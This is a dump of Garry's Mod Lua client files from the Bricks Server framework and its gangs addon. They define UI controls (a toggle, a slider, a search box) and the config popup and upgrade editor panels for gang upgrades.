		draw.RoundedBox( backH/2, 0, (h/2)-(backH/2), w, backH, (self.backgroundCol or BRICKS_SERVER.Func.GetTheme( 3 )) )
		
		if( self.toggled ) then
			self2.xPos = math.Clamp( self2.xPos+3, self2.minXPos, self2.maxXPos )
		else
			self2.xPos = math.Clamp( self2.xPos-3, self2.minXPos, self2.maxXPos )
		end

		BRICKS_SERVER.Func.DrawCircle( self2.xPos, h/2, circleRadius, (self.toggled and BRICKS_SERVER.DEVCONFIG.BaseThemes.Green) or BRICKS_SERVER.DEVCONFIG.BaseThemes.Red )
	end
	self.toggle.DoClick = function()
		self.toggled = not self.toggled

		if( self.OnChange ) then
			self.OnChange( self.toggled )
		end
	end
end

function PANEL:SetValue( value )
	if( value ) then
		self.toggle.xPos = self.toggle.maxXPos or 0
		self.toggled = true
	else
		self.toggle.xPos = self.toggle.minXPos or 0
		self.toggled = false
	end
end

function PANEL:SetDisabled( value )
	self.toggle:SetDisabled( value )
end

function PANEL:SetTitle( title )
	self.title = title

	surface.SetFont( "BRICKS_SERVER_Font20" )
	local titleX, titleY = surface.GetTextSize( self.title or BRICKS_SERVER.Func.L( "toggle" ) )

	if( title != "" ) then
		self:SetWide( 45+5+titleX )
	else
		self:SetWide( 45 )
	end
end

function PANEL:Paint( w, h )
	draw.SimpleText( (self.title or BRICKS_SERVER.Func.L( "toggle" )), "BRICKS_SERVER_Font20", self.toggle:GetWide()+5, h/2-1, BRICKS_SERVER.Func.GetTheme( 6 ), 0, TEXT_ALIGN_CENTER )
end
 
vgui.Register( "bricks_server_dcheckbox", PANEL, "DPanel" )
--PATH addons/brick_s_server_framework/lua/bricks_server/vgui/bricks_server_dslider.lua:

local PANEL = {}

AccessorFunc( PANEL, "NumSlider", "NumSlider" )

AccessorFunc( PANEL, "m_fSlideX", "SlideX" )
AccessorFunc( PANEL, "m_fSlideY", "SlideY" )

AccessorFunc( PANEL, "m_iLockX", "LockX" )
AccessorFunc( PANEL, "m_iLockY", "LockY" )

AccessorFunc( PANEL, "Dragging", "Dragging" )
AccessorFunc( PANEL, "m_bTrappedInside", "TrapInside" )
AccessorFunc( PANEL, "m_iNotches", "Notches" )

function PANEL:Init()
	self:SetMouseInputEnabled( true )
	self:SetTrapInside( true )

	self:SetSlideX( 0 )
	self:SetSlideY( 0.5 )

	self.Knob = vgui.Create( "DButton", self )
	self.Knob:SetText( "" )
	self.Knob:SetSize( 20, 20 )
	self.Knob.Paint = function( panel, w, h )
		BRICKS_SERVER.Func.DrawCircle( w/2, h/2, h/2, BRICKS_SERVER.Func.GetTheme( 5, 75 ) )
		BRICKS_SERVER.Func.DrawCircle( w/2, h/2, h/2-2, BRICKS_SERVER.Func.GetTheme( 5 ) )
	end
	self.Knob.OnCursorMoved = function( panel, x, y )
		local x, y = panel:LocalToScreen( x, y )
		x, y = self:ScreenToLocal( x, y )
		self:OnCursorMoved( x, y )
	end

	self:SetLockY( 0.5 )
end

function PANEL:Paint( w, h )
	surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 3 ) )
	surface.DrawRect( 10, (h/2)-1, w-20, 2 )
end

--
-- We we currently editing?
--
function PANEL:IsEditing()

	return self.Dragging || self.Knob.Depressed

end

function PANEL:SetBackground( img )

	if ( !self.BGImage ) then
		self.BGImage = vgui.Create( "DImage", self )
	end

	self.BGImage:SetImage( img )
	self:InvalidateLayout()

end

function PANEL:SetImage( strImage )
	-- RETIRED
end

function PANEL:SetImageColor( color )
	-- RETIRED
end

function PANEL:SetEnabled( b )
	self.Knob:SetEnabled( b )
	FindMetaTable( "Panel" ).SetEnabled( self, b ) -- There has to be a better way!
end

function PANEL:OnCursorMoved( x, y )

	if ( !self.Dragging && !self.Knob.Depressed ) then return end

	local w, h = self:GetSize()
	local iw, ih = self.Knob:GetSize()

	if ( self.m_bTrappedInside ) then

		w = w - iw
		h = h - ih

		x = x - iw * 0.5
		y = y - ih * 0.5

	end

	x = math.Clamp( x, 0, w ) / w
	y = math.Clamp( y, 0, h ) / h

	if ( self.m_iLockX ) then x = self.m_iLockX end
	if ( self.m_iLockY ) then y = self.m_iLockY end

	x, y = self:TranslateValues( x, y )

	self:SetSlideX( x )
	self:SetSlideY( y )

	self:InvalidateLayout()

end

function PANEL:TranslateValues( x, y )

	-- Give children the chance to manipulate the values..
	return x, y

end

function PANEL:OnMousePressed( mcode )

	if ( !self:IsEnabled() ) then return true end

	-- When starting dragging with not pressing on the knob.
	self.Knob.Hovered = true

	self:SetDragging( true )
	self:MouseCapture( true )

	local x, y = self:CursorPos()
	self:OnCursorMoved( x, y )

end

function PANEL:OnMouseReleased( mcode )

	-- This is a hack. Panel.Hovered is not updated when dragging a panel (Source's dragging, not Lua Drag'n'drop)
	self.Knob.Hovered = vgui.GetHoveredPanel() == self.Knob

	self:SetDragging( false )
	self:MouseCapture( false )

end

function PANEL:PerformLayout()

	local w, h = self:GetSize()
	local iw, ih = self.Knob:GetSize()

	if ( self.m_bTrappedInside ) then

		w = w - iw
		h = h - ih
		self.Knob:SetPos( ( self.m_fSlideX || 0 ) * w, ( self.m_fSlideY || 0 ) * h )

	else

		self.Knob:SetPos( ( self.m_fSlideX || 0 ) * w - iw * 0.5, ( self.m_fSlideY || 0 ) * h - ih * 0.5 )

	end

	if ( self.BGImage ) then
		self.BGImage:StretchToParent( 0, 0, 0, 0 )
		self.BGImage:SetZPos( -10 )
	end

end

function PANEL:SetSlideX( i )
	self.m_fSlideX = i
	self:InvalidateLayout()
end

function PANEL:SetSlideY( i )
	self.m_fSlideY = i
	self:InvalidateLayout()
end

function PANEL:GetDragging()
	return self.Dragging || self.Knob.Depressed
end

derma.DefineControl( "bricks_server_dslider", "", PANEL, "Panel" )

--PATH addons/brick_s_server_framework/lua/bricks_server/vgui/bricks_server_search.lua:

local PANEL = {}

local strAllowedNumericCharacters = "1234567890.-"

AccessorFunc( PANEL, "m_bAllowEnter", "EnterAllowed", FORCE_BOOL )
AccessorFunc( PANEL, "m_bUpdateOnType", "UpdateOnType", FORCE_BOOL ) -- Update the convar as we type
AccessorFunc( PANEL, "m_bNumeric", "Numeric", FORCE_BOOL )
AccessorFunc( PANEL, "m_bHistory", "HistoryEnabled", FORCE_BOOL )
AccessorFunc( PANEL, "m_bDisableTabbing", "TabbingDisabled", FORCE_BOOL )

AccessorFunc( PANEL, "m_FontName", "Font" )
AccessorFunc( PANEL, "m_bBorder", "DrawBorder" )
AccessorFunc( PANEL, "m_bBackground", "PaintBackground" )
AccessorFunc( PANEL, "m_bBackground", "DrawBackground" ) -- Deprecated

AccessorFunc( PANEL, "m_colText", "TextColor" )
AccessorFunc( PANEL, "m_hintText", "HintText" )
AccessorFunc( PANEL, "m_colHighlight", "HighlightColor" )
AccessorFunc( PANEL, "m_colCursor", "CursorColor" )

AccessorFunc( PANEL, "m_colPlaceholder", "PlaceholderColor" )
AccessorFunc( PANEL, "m_txtPlaceholder", "PlaceholderText" )

Derma_Install_Convar_Functions( PANEL )

function PANEL:Init()

	self:SetHistoryEnabled( false )
	self.History = {}
	self.HistoryPos = 50

	--
	-- We're going to draw these ourselves in
	-- the skin system - so disable them here.
	-- This will leave it only drawing text.
	--
	self:SetPaintBorderEnabled( false )
	self:SetPaintBackgroundEnabled( false )

	--
	-- These are Lua side commands
	-- Defined above using AccessorFunc
	--
	self:SetDrawBorder( true )
	self:SetPaintBackground( true )
	self:SetEnterAllowed( true )
	self:SetUpdateOnType( false )
	self:SetNumeric( false )
	self:SetAllowNonAsciiCharacters( true )

	-- Nicer default height
	self:SetTall( 20 )

	-- Clear keyboard focus when we click away
	self.m_bLoseFocusOnClickAway = true

	-- Beam Me Up Scotty
	self:SetCursor( "beam" )

	self:SetFont( "BRICKS_SERVER_Font25" )
	self:SetText( "" )
	self:SetTextColor( Color( 255, 255, 255, 20 ) )
	self:SetCursorColor( Color( 255, 255, 255 ) )
	self:DockMargin( 10, 0, 0, 0 )
end

function PANEL:IsEditing()
	return self == vgui.GetKeyboardFocus()
end

function PANEL:OnKeyCodeTyped( code )

	self:OnKeyCode( code )

	if ( code == KEY_ENTER && !self:IsMultiline() && self:GetEnterAllowed() ) then

		if ( IsValid( self.Menu ) ) then
			self.Menu:Remove()
		end

		self:FocusNext()
		self:OnEnter()
		self.HistoryPos = 0

	end

	if ( self.m_bHistory || IsValid( self.Menu ) ) then

		if ( code == KEY_UP ) then
			self.HistoryPos = self.HistoryPos - 1
			self:UpdateFromHistory()
		end

		if ( code == KEY_DOWN || code == KEY_TAB ) then
			self.HistoryPos = self.HistoryPos + 1
			self:UpdateFromHistory()
		end

	end

end

function PANEL:OnKeyCode( code )
end

function PANEL:ApplySchemeSettings()

	self:SetFontInternal( self.m_FontName )

	derma.SkinHook( "Scheme", "TextEntry", self )

end

function PANEL:GetTextColor()

	return self.m_colText || self:GetSkin().colTextEntryText

end

function PANEL:GetHintText()

	return self.m_hintText

end

function PANEL:GetPlaceholderColor()

	return self.m_colPlaceholder || self:GetSkin().colTextEntryTextPlaceholder

end

function PANEL:GetHighlightColor()

	return self.m_colHighlight || self:GetSkin().colTextEntryTextHighlight

end

function PANEL:GetCursorColor()

	return self.m_colCursor || self:GetSkin().colTextEntryTextCursor

end

function PANEL:UpdateFromHistory()

	if ( IsValid( self.Menu ) ) then
		return self:UpdateFromMenu()
	end

	local pos = self.HistoryPos
	-- Is the Pos within bounds?
	if ( pos < 0 ) then pos = #self.History end
	if ( pos > #self.History ) then pos = 0 end

	local text = self.History[ pos ]
	if ( !text ) then text = "" end

	self:SetText( text )
	self:SetCaretPos( text:len() )

	self:OnTextChanged()

	self.HistoryPos = pos

end

function PANEL:UpdateFromMenu()

	local pos = self.HistoryPos
	local num = self.Menu:ChildCount()

	self.Menu:ClearHighlights()

	if ( pos < 0 ) then pos = num end
	if ( pos > num ) then pos = 0 end

	local item = self.Menu:GetChild( pos )
	if ( !item ) then
		self:SetText( "" )
		self.HistoryPos = pos
		return
	end

	self.Menu:HighlightItem( item )

	local txt = item:GetText()

	self:SetText( txt )
	self:SetCaretPos( txt:len() )

	self:OnTextChanged( true )

	self.HistoryPos = pos

end

function PANEL:OnTextChanged( noMenuRemoval )

	self.HistoryPos = 0

	if ( self:GetUpdateOnType() ) then
		self:UpdateConvarValue()
		self:OnValueChange( self:GetText() )
	end

	if ( IsValid( self.Menu ) && !noMenuRemoval ) then
		self.Menu:Remove()
	end

	local tab = self:GetAutoComplete( self:GetText() )
	if ( tab ) then
		self:OpenAutoComplete( tab )
	end

	self:OnChange()

end

function PANEL:OnChange()
end

function PANEL:OpenAutoComplete( tab )

	if ( !tab ) then return end
	if ( #tab == 0 ) then return end

	self.Menu = DermaMenu()

	for k, v in pairs( tab ) do

		self.Menu:AddOption( v, function() self:SetText( v ) self:SetCaretPos( v:len() ) self:RequestFocus() end )

	end

	local x, y = self:LocalToScreen( 0, self:GetTall() )
	self.Menu:SetMinimumWidth( self:GetWide() )
	self.Menu:Open( x, y, true, self )
	self.Menu:SetPos( x, y )
	self.Menu:SetMaxHeight( ( ScrH() - y ) - 10 )

end

local Alpha = 20
function PANEL:Think()

	self:ConVarStringThink()

	if( self:IsEditing() and Alpha != 255 ) then
		Alpha = math.Clamp( Alpha+20, 20, 255 )
	elseif( not self:IsEditing() and Alpha != 20 ) then
		Alpha = math.Clamp( Alpha-20, 20, 255 )
	end

	if( self:GetTextColor() != Color( 255, 255, 255, 255 ) or self:GetTextColor() != Color( 255, 255, 255, 20 ) ) then
		self:SetTextColor( Color( 255, 255, 255, Alpha ) )
	end
end

function PANEL:OnEnter()

	-- For override
	self:UpdateConvarValue()
	self:OnValueChange( self:GetText() )

end

function PANEL:UpdateConvarValue()

	-- This only kicks into action if this variable has
	-- a ConVar associated with it.
	self:ConVarChanged( self:GetValue() )

end

function PANEL:Paint( w, h )
	local panel = self

	if ( panel.GetPlaceholderText && panel.GetPlaceholderColor && panel:GetPlaceholderText() && panel:GetPlaceholderText():Trim() != "" && panel:GetPlaceholderColor() && ( !panel:GetText() || panel:GetText() == "" ) ) then

		local oldText = panel:GetText()

		local str = panel:GetPlaceholderText()
		if ( str:StartWith( "#" ) ) then str = str:sub( 2 ) end
		str = language.GetPhrase( str )

		panel:SetText( str )
		panel:DrawTextEntryText( panel:GetPlaceholderColor(), panel:GetHighlightColor(), panel:GetCursorColor() )
		panel:SetText( oldText )

		return
	end

	panel:DrawTextEntryText( panel:GetTextColor(), panel:GetHighlightColor(), panel:GetCursorColor() )

	if( not self:IsEditing() and self:GetText() == "" ) then
		draw.SimpleText( (self.backText or BRICKS_SERVER.Func.L( "search" )), self:GetFont(), 0, h/2, (self.backTextColor or Color( 255, 255, 255, 20 )), 0, TEXT_ALIGN_CENTER )
	end
end

function PANEL:PerformLayout()

	derma.SkinHook( "Layout", "TextEntry", self )

end

function PANEL:SetValue( strValue )

	-- Don't update if we're typing into it!
	-- I'm sure a lot of people will want to reverse this behaviour :(
	if ( vgui.GetKeyboardFocus() == self ) then return end

	local CaretPos = self:GetCaretPos()

	self:SetText( strValue )
	self:OnChange( strValue )

	self:SetCaretPos( CaretPos )

end

function PANEL:OnValueChange( strValue )
	-- For Override
end

function PANEL:CheckNumeric( strValue )

	-- Not purely numeric, don't run the check
	if ( !self:GetNumeric() ) then return false end

	-- God I hope numbers look the same in every language
	if ( !string.find( strAllowedNumericCharacters, strValue, 1, true ) ) then

		-- Noisy Error?
		return true

	end

	return false

end

function PANEL:SetDisabled( bDisabled )
	self:SetEnabled( !bDisabled )
end

function PANEL:GetDisabled( bDisabled )
	return !self:IsEnabled()
end

function PANEL:AllowInput( strValue )

	-- This is layed out like this so you can easily override and
	-- either keep or remove this numeric check.
	if ( self:CheckNumeric( strValue ) ) then return true end

end

function PANEL:SetEditable( b )

	self:SetKeyboardInputEnabled( b )
	self:SetMouseInputEnabled( b )

end

function PANEL:OnGetFocus()

	--
	-- These hooks are here for the sake of things like the spawn menu
	-- which don't have key focus until you click on one of the text areas.
	--
	-- If you make a control for the spawnmenu that requires keyboard input
	-- You should have these 3 functions in your panel, so it can handle it.
	--

	hook.Run( "OnTextEntryGetFocus", self )

end

function PANEL:OnLoseFocus()

	self:UpdateConvarValue()

	hook.Call( "OnTextEntryLoseFocus", nil, self )

end

function PANEL:OnMousePressed( mcode )

	self:OnGetFocus()

end

function PANEL:AddHistory( txt )

	if ( !txt || txt == "" ) then return end

	table.RemoveByValue( self.History, txt )
	table.insert( self.History, txt )

end

function PANEL:GetAutoComplete( txt )
	-- for override. Return a table of strings.
end

function PANEL:GetInt()

	return math.floor( tonumber( self:GetText() ) + 0.5 )

end

function PANEL:GetFloat()

	return tonumber( self:GetText() )

end

derma.DefineControl( "bricks_server_search", "A simple TextEntry control", PANEL, "TextEntry" )
--PATH addons/bricks_gangs/lua/bricks_server/modules/gangs/client/cl_gang_configpopups.lua:
function BRICKS_SERVER.Func.CreateConfigPopup( onSave, onCancel, lastActionFunc )
	BRS_CONFIG_POPUP = vgui.Create( "DFrame" )
	BRS_CONFIG_POPUP:SetSize( ScrW(), ScrH() )
	BRS_CONFIG_POPUP:Center()
	BRS_CONFIG_POPUP:SetTitle( "" )
	BRS_CONFIG_POPUP:ShowCloseButton( false )
	BRS_CONFIG_POPUP:SetDraggable( false )
	BRS_CONFIG_POPUP:MakePopup()
	BRS_CONFIG_POPUP:SetAlpha( 0 )
	BRS_CONFIG_POPUP:AlphaTo( 255, 0.1, 0 )
	BRS_CONFIG_POPUP.Paint = function( self2 ) 
		BRICKS_SERVER.Func.DrawBlur( self2, 4, 4 )
	end

	local backgroundPanel = vgui.Create( "DPanel", BRS_CONFIG_POPUP )
	backgroundPanel.Paint = function( self2, w, h ) 
		local x, y = self2:LocalToScreen( 0, 0 )

		BRICKS_SERVER.BSHADOWS.BeginShadow()
		draw.RoundedBox( 5, x, y, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )			
		BRICKS_SERVER.BSHADOWS.EndShadow( 1, 2, 2, 255, 0, 0, false )
	end

	local backRightPanel = vgui.Create( "DPanel", backgroundPanel )
	backRightPanel:Dock( RIGHT )
	backRightPanel.Paint = function( self2, w, h ) 
		draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 3 ) )
	end

	local backLeftPanel = vgui.Create( "DPanel", backgroundPanel )
	backLeftPanel:Dock( LEFT )
	backLeftPanel.Paint = function( self2, w, h ) 
		if( self2.iconMat ) then
			surface.SetDrawColor( 255, 255, 255, 255 )
			surface.SetMaterial( self2.iconMat )
			local iconSize = 64
			surface.DrawTexturedRect( (w/2)-(iconSize/2), (h/2)-(iconSize/2), iconSize, iconSize )
		end
	end

	backgroundPanel.OnSizeChanged = function( self2, w, h )
		backRightPanel:SetWide( w/2 )
		backLeftPanel:SetWide( w/2 )
	end
	
	backgroundPanel:SetWide( 800 )
	backgroundPanel:Center()

	function backRightPanel.FillOptions( configTable, actions, extraActionsCount )
		backRightPanel:Clear()

		function backRightPanel.AddAction( v, k )
			local actionButton
			if( v[3] ) then
				actionButton = vgui.Create( "DButton", backRightPanel )
				actionButton:SetText( "" )
			else
				actionButton = vgui.Create( "DPanel", backRightPanel )
			end
			actionButton:Dock( TOP )
			local margin = (v[2] and 10) or 15
			actionButton:DockMargin( margin, 10, margin, 0 )
			actionButton:SetTall( 40 )
			local changeAlpha = 0
			actionButton.Paint = function( self2, w, h )
				draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
				
				if( v[3] ) then
					if( self2:IsHovered() and not self2:IsDown() ) then
						changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
					else
						changeAlpha = math.Clamp( changeAlpha-10, 0, 255 )
					end

					surface.SetAlphaMultiplier( changeAlpha/255 )
						draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ) )
					surface.SetAlphaMultiplier( 1 )

					BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, BRICKS_SERVER.Func.GetTheme( 5 ) )
				end

				if( v[2] ) then
					surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 6 ) )
					surface.SetMaterial( v[2] )
					local iconSize = 24
					surface.DrawTexturedRect( (h-iconSize)/2, (h/2)-(iconSize/2), iconSize, iconSize )
				end

				if( v[4] and configTable[v[4]] and not v[5] ) then
					draw.SimpleText( v[1] .. " - " .. string.sub( configTable[v[4]], 1, 15 ) .. ((string.len( configTable[v[4]] ) > 15 and "...") or ""), "BRICKS_SERVER_Font25", w/2, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				elseif( v[5] and isfunction( v[5] ) ) then
					draw.SimpleText( v[1] .. " - " .. v[5](), "BRICKS_SERVER_Font25", w/2, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				else
					draw.SimpleText( v[1], "BRICKS_SERVER_Font25", w/2, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end
			end
			if( v[3] ) then
				actionButton.DoClick = v[3]
			end

			if( (k or 0) == #actions and backRightPanel.lastActionFunc ) then
				local extraToAdd = backRightPanel.lastActionFunc( extraActionsCount )
				extraActionsCount = (extraActionsCount or 0)+(extraToAdd or 0)
			end
		end

		for k, v in ipairs( actions or {} ) do
			backRightPanel.AddAction( v, k )
		end

		local buttonPanel = vgui.Create( "DPanel", backRightPanel )
		buttonPanel:Dock( BOTTOM )
		buttonPanel:DockMargin( 10, 10, 10, 10 )
		buttonPanel:SetTall( 40 )
		buttonPanel.Paint = function( self2, w, h ) end

		local leftButton = vgui.Create( "DButton", buttonPanel )
		leftButton:Dock( LEFT )
		leftButton:SetText( "" )
		leftButton:DockMargin( 0, 0, 0, 0 )
		local changeAlpha = 0
		leftButton.Paint = function( self2, w, h )
			if( self2:IsHovered() and not self2:IsDown() ) then
				changeAlpha = math.Clamp( changeAlpha+10, 0, 75 )
			else
				changeAlpha = math.Clamp( changeAlpha-10, 0, 75 )
			end
			
			draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.DEVCONFIG.BaseThemes.Green )
	
			surface.SetAlphaMultiplier( changeAlpha/255 )
				draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkGreen )
			surface.SetAlphaMultiplier( 1 )

			BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkGreen )
	
			draw.SimpleText( BRICKS_SERVER.Func.L( "save" ), "BRICKS_SERVER_Font25", w/2, h/2, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
		end
		leftButton.DoClick = function()
			onSave( configTable )

			BRS_CONFIG_POPUP:AlphaTo( 0, 0.1, 0, function()
				if( IsValid( BRS_CONFIG_POPUP ) ) then
					BRS_CONFIG_POPUP:Remove()
				end
			end )
		end

		local rightButton = vgui.Create( "DButton", buttonPanel )
		rightButton:Dock( RIGHT )
		rightButton:SetText( "" )
		rightButton:DockMargin( 0, 0, 0, 0 )
		local changeAlpha = 0
		rightButton.Paint = function( self2, w, h )
			if( self2:IsHovered() and not self2:IsDown() ) then
				changeAlpha = math.Clamp( changeAlpha+10, 0, 75 )
			else
				changeAlpha = math.Clamp( changeAlpha-10, 0, 75 )
			end
			
			draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.DEVCONFIG.BaseThemes.Red )
	
			surface.SetAlphaMultiplier( changeAlpha/255 )
				draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkRed )
			surface.SetAlphaMultiplier( 1 )

			BRICKS_SERVER.Func.DrawClickCircle( self2, w, h, BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkRed )
	
			draw.SimpleText( BRICKS_SERVER.Func.L( "cancel" ), "BRICKS_SERVER_Font25", w/2, h/2, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
		end
		rightButton.DoClick = function()
			onCancel()

			BRS_CONFIG_POPUP:AlphaTo( 0, 0.1, 0, function()
				if( IsValid( BRS_CONFIG_POPUP ) ) then
					BRS_CONFIG_POPUP:Remove()
				end
			end )
		end

		backgroundPanel:SetTall( math.max( ScrH()*0.45, buttonPanel:GetTall()+(2*10)+((#actions+(extraActionsCount or 0))*50) ) )
		backgroundPanel:Center()

		leftButton:SetWide( (backRightPanel:GetWide()-30)/2 )
		rightButton:SetWide( (backRightPanel:GetWide()-30)/2 )
	end

	function backLeftPanel.Refresh()
		backLeftPanel:Clear()

		local topMargin, bottomMargin = backgroundPanel:GetTall()*0.075, 145

		local itemInfoDisplay = vgui.Create( "DPanel", backLeftPanel )
		itemInfoDisplay:SetSize( backLeftPanel:GetWide(), backgroundPanel:GetTall()-topMargin-bottomMargin )
		itemInfoDisplay:SetPos( backLeftPanel:GetWide()-itemInfoDisplay:GetWide(), topMargin )
		itemInfoDisplay.Paint = function( self2, w, h ) 
			draw.SimpleText( (backLeftPanel.Name or BRICKS_SERVER.Func.L( "nil" )), "BRICKS_SERVER_Font25", w/2, 5, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, 0 )
		end

		local itemInfoNoticeBack = vgui.Create( "DPanel", itemInfoDisplay )
		itemInfoNoticeBack:SetSize( 0, 35 )
		itemInfoNoticeBack:SetPos( (itemInfoDisplay:GetWide()/2)-(itemInfoNoticeBack:GetWide()/2), 5+28 )
		itemInfoNoticeBack.Paint = function( self2, w, h ) end

		for k, v in pairs( backLeftPanel.Notices or {} ) do
			surface.SetFont( "BRICKS_SERVER_Font20" )
			local textX, textY = surface.GetTextSize( v[1] )
			local boxW, boxH = textX+10, textY

			local itemInfoNotice = vgui.Create( "DPanel", itemInfoNoticeBack )
			itemInfoNotice:Dock( LEFT )
			itemInfoNotice:DockMargin( 0, 0, 5, 0 )
			itemInfoNotice:SetWide( boxW )
			itemInfoNotice.Paint = function( self2, w, h ) 
				draw.RoundedBox( 5, 0, 0, w, h, (v[2] or BRICKS_SERVER.Func.GetTheme( 5 )) )
				draw.SimpleText( v[1], "BRICKS_SERVER_Font20", w/2, (h/2)-1, BRICKS_SERVER.Func.GetTheme( 6 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
			end

			if( itemInfoNoticeBack:GetWide() <= 5 ) then
				itemInfoNoticeBack:SetSize( itemInfoNoticeBack:GetWide()+boxW, boxH )
			else
				itemInfoNoticeBack:SetSize( itemInfoNoticeBack:GetWide()+5+boxW, boxH )
			end
			itemInfoNoticeBack:SetPos( (itemInfoDisplay:GetWide()/2)-(itemInfoNoticeBack:GetWide()/2), 5+28 )
		end
	end

	return backgroundPanel, backRightPanel, backLeftPanel
end

function BRICKS_SERVER.Func.CreateUpgradeEditor( oldUpgradeTable, upgradeKey, onSave, onCancel )
	local upgradeTable = table.Copy( oldUpgradeTable )

	local backgroundPanel, backRightPanel, backLeftPanel = BRICKS_SERVER.Func.CreateConfigPopup( onSave, onCancel )

	backRightPanel.lastActionFunc = function()
		local reqInfoTable = upgradeTable.Default or {}
		if( (BRICKS_SERVER.DEVCONFIG.GangUpgrades[upgradeTable.Type or upgradeKey] or {}).Unlimited ) then
			reqInfoTable = upgradeTable.ReqInfo or {}
		end

		for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangUpgrades[upgradeTable.Type or upgradeKey].ReqInfo ) do
			local actionButton = vgui.Create( "DButton", backRightPanel )
			actionButton:SetText( "" )
			actionButton:Dock( TOP )
			actionButton:DockMargin( 15, 10, 15, 0 )
			actionButton:SetTall( 40 )
			local changeAlpha = 0
			actionButton.Paint = function( self2, w, h )
				if( self2:IsDown() ) then
					changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
				elseif( self2:IsHovered() ) then
					changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
				else
					changeAlpha = math.Clamp( changeAlpha-10, 0, 255 )
				end
				
				draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
		
				surface.SetAlphaMultiplier( changeAlpha/255 )
					draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ) )
				surface.SetAlphaMultiplier( 1 )

				if( v[2] == "bool" ) then
					draw.SimpleText( v[1] .. " - " .. ((reqInfoTable[k] and "TRUE") or "FALSE"), "BRICKS_SERVER_Font25", w/2, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				elseif( reqInfoTable[k] ) then
					draw.SimpleText( v[1] .. " - " .. reqInfoTable[k], "BRICKS_SERVER_Font25", w/2, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				else
					draw.SimpleText( v[1], "BRICKS_SERVER_Font25", w/2, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end
			end
			actionButton.DoClick = function()
				if( v[2] == "string" or v[2] == "integer" ) then 
					BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "valueQuery", v[1] ), (reqInfoTable[k] or 0), function( text ) 
						reqInfoTable[k] = text
						backLeftPanel.RefreshInfo()
					end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), (v[2] == "integer") )
				elseif( v[2] == "bool" ) then 
					reqInfoTable[k] = not reqInfoTable[k]
					backLeftPanel.RefreshInfo()
				elseif( v[2] == "table" and v[3] and BRICKS_SERVER.Func.GetList( v[3] ) ) then 
					BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "dataValueQuery" ), (reqInfoTable[k] or ""), BRICKS_SERVER.Func.GetList( v[3] ), function( value, data ) 
						if( BRICKS_SERVER.Func.GetList( v[3] )[data] ) then
							reqInfoTable[k] = data

							if( v[4] ) then
								local newupgradeTable = v[4]( upgradeTable ) 
								if( newupgradeTable ) then
									upgradeTable = newupgradeTable
								end
							end
							backLeftPanel.RefreshInfo()
						else
							notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidChoice" ), 1, 3 )
						end
					end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
				end
			end
		end
	end

	local devConfigTable = BRICKS_SERVER.DEVCONFIG.GangUpgrades[upgradeTable.Type or upgradeKey]
	function backLeftPanel.RefreshInfo()
		backLeftPanel:Clear()

		devConfigTable = BRICKS_SERVER.DEVCONFIG.GangUpgrades[upgradeTable.Type or upgradeKey]
        
        if( upgradeTable.Icon ) then
            BRICKS_SERVER.Func.GetImage( upgradeTable.Icon, function( mat ) 
                backLeftPanel.iconMat = mat 
            end )
        end

		backLeftPanel.Name = upgradeTable.Name or BRICKS_SERVER.Func.L( "gangNewUpgrade" )

		backLeftPanel.Notices = {}

		if( devConfigTable.Unlimited ) then
			table.insert( backLeftPanel.Notices, { DarkRP.formatMoney( upgradeTable.Price ), BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkGreen } )
		end

		if( upgradeTable.Level ) then
			table.insert( backLeftPanel.Notices, { BRICKS_SERVER.Func.L( "levelX", upgradeTable.Level ) } )
		end

		if( upgradeTable.Group ) then
			local groupTable
			for k, v in pairs( BRICKS_SERVER.CONFIG.GENERAL.Groups ) do
				if( v[1] == upgradeTable.Group ) then
					groupTable = v
				end
			end

			if( groupTable ) then
				table.insert( backLeftPanel.Notices, { (groupTable[1] or BRICKS_SERVER.Func.L( "none" )), groupTable[3] } )
			end
		end

